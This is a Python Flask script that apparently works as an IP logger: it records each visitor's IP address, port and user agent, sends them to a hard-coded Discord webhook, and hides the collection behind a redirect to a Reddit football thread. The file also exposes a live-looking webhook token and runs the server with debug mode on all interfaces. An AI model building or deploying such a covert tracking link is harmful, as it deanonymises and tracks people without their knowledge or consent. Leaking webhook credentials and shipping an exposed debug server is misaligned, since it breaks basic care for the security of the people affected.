import requests
from flask import Flask, request, redirect
from datetime import datetime
import ipaddress

app = Flask(__name__)

# ===================== CONFIG =====================
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430208752837066845/HFmlZHpwB_LgcbxjoFb47dvk4-5p6aWDDkKLVh_z2Oy_fBZT12DDkS4p-T8SXKkUEaTw"
REDIRECT_URL = "https://www.reddit.com/r/football/comments/16n8k5s/can_a_taller_player_become_renowned_for_their/?rdt=62221"

logged_ips = set()

def get_ip_type(ip):
    try:
        return "IPv6" if ipaddress.ip_address(ip).version == 6 else "IPv4"
    except ValueError:
        return "Unknown"

def send_to_discord(ip, port, ua):
    embed = {
        "username": "🌍 Visitor Bot",
        "embeds": [{
            "title": "🚶‍♂️ New Visitor Detected",
            "color": 7506394,
            "fields": [
                {"name": "🖥️ IP Address", "value": f"`{ip}` ({get_ip_type(ip)})", "inline": True},
                {"name": "🔌 Port", "value": f"{port}", "inline": True},
                {"name": "🧾 User-Agent", "value": f"`{ua}`", "inline": False},
                {"name": "⏱️ Timestamp", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
            ]
        }]
    }
    requests.post(DISCORD_WEBHOOK_URL, json=embed)

@app.route('/')
def index():
    # Get real IP
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()

    port = request.environ.get('REMOTE_PORT', "Unknown")
    user_agent = request.headers.get('User-Agent', "Unknown")

    if ip not in logged_ips:
        send_to_discord(ip, port, user_agent)
        logged_ips.add(ip)

    return redirect(REDIRECT_URL, code=302)

if __name__ == "__main__":
    # For local testing only
    app.run(host="0.0.0.0", port=5000, debug=True)
